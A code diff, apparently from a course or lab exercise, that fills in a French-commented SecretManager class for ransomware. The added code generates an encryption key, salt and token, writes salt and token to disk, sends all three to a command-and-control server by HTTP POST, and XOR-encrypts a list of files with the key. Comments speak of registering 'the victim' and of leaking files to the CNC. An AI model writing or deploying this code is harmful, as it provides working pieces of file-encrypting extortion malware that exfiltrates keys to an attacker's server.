@@ -28,24 +28,92 @@ class SecretManager:
         self._log = logging.getLogger(self.__class__.__name__)
 
     def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        raise NotImplemented()
+
+        # Fonction de dérivation de la clé
+        key_derivate_function = PBKDF2HMAC(
+            algorithm   = hashes.SHA256(),
+            length      = self.KEY_LENGTH,
+            salt        = salt,
+            iterations  = self.ITERATION
+        )
+
+        # Dérivation de la clé
+        derivate_key = key_derivate_function(key)
+        return derivate_key
 
 
     def create(self)->Tuple[bytes, bytes, bytes]:
-        raise NotImplemented()
+        # Génération de la clé
+        key = secrets.token_bytes(self.KEY_LENGTH)
+        # Génération du sel
+        salt = secrets.token_bytes(self.SALT_LENGTH)
+        # Génération du token
+        token = secrets.token_bytes(self.TOKEN_LENGTH)
 
+        return (key, salt, token)
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+        
+        url = f"http://{self._remote_host_port}/new"
+        data = {
+            "token" : self.bin_to_b64(token),
+            "salt" : self.bin_to_b64(salt),
+            "key" : self.bin_to_b64(key)
+        }
+
+        try:
+            reponse = requests.post(url, json=data)
+        except ConnectionError as e:
+            self._log.error("ERREUR ET CA FAIT CHIER")
+            raise e
+
+        # Vérification de la bonne réception du message
+        if reponse.status_code == 200:
+            self._log.info(f"data successfully sent to {url}")
+        else:
+            self._log.error("Error, POST request failed")
+
 
     def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+
+        # Génération des valeurs cryptographiques
+        (self._key, self._salt, self._token) = self.create()
+
+        # Création du dossier si nécessaire
+        os.makedirs(self._path, exist_ok=True)
+
+
+        # Génération du chemin de salt.bin
+        chemin_pour_salt_dot_bin = os.path.join(self._path, "salt.bin")
+        # Génération du chemin de token.bin
+        chemin_pour_token_dot_bin = os.path.join(self._path, "token.bin")
+
+        # Vérification de la non-existance de salt.bin
+        if(os.path.exists(chemin_pour_salt_dot_bin)):
+            os.remove(chemin_pour_salt_dot_bin)
+        # Vérification de la non-existance de token.bin
+        if(os.path.exists(chemin_pour_token_dot_bin)):
+            os.remove(chemin_pour_token_dot_bin)
+
+        # Ecriture du fichier salt.bin 
+        fichier_salt_dot_bin = open(chemin_pour_salt_dot_bin, 'wb') 
+        fichier_salt_dot_bin.write(self._salt)
+        fichier_salt_dot_bin.close()
+        # Ecriture du fichier token.bin 
+        chemin_pour_token_dot_bin = open(chemin_pour_token_dot_bin, 'wb') 
+        chemin_pour_token_dot_bin.write(self._token)
+        chemin_pour_token_dot_bin.close()
+
+
+        # Envoi des données au CNC
+        self.post_new(salt  = self._salt,
+                      key   = self._key,
+                      token = self._token)
+
 
     def load(self)->None:
         # function to load crypto data
@@ -60,12 +128,20 @@ class SecretManager:
         raise NotImplemented()
 
     def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
-        raise NotImplemented()
+        # Hashage du token 
+        hash_token = sha256(self._token)
+        # Transformation en string
+        str_token = hash_token.hexdigest()
+        
+        return str_token
+        
 
     def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        raise NotImplemented()
+        # Pour chaque fichier, on le chiffre avec la clé
+        for file in files:
+            print(file)
+            xorfile(file, self._key)
+
 
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
